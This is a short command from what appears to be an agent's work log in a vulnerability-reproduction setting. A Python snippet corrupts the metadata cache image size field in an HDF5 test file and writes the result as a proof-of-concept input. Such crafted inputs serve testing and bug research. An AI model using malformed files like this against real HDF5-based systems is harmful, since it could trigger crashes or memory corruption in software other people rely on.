Running command: cd /workspace && python3 - <<'PY'
from pathlib import Path
src=Path('/workspace/repo-vul/src-vul/hdf5/tools/test/misc/testfiles/h5clear_mdc_image.h5')
b=bytearray(src.read_bytes())
# Corrupt metadata cache image length in superblock extension MDCI message to 2.
# Existing mdci message at OHDR offset 1325: addr little-endian at 1353, size little-endian at 1361.
b[1361:1369]=(2).to_bytes(8,'little')
Path('/workspace/poc_mdci_size2').write_bytes(bytes([0])+b)
print(len(b), b[1353:1361].hex(), b[1361:1369].hex(), b.find(b'MDCI'))
PY
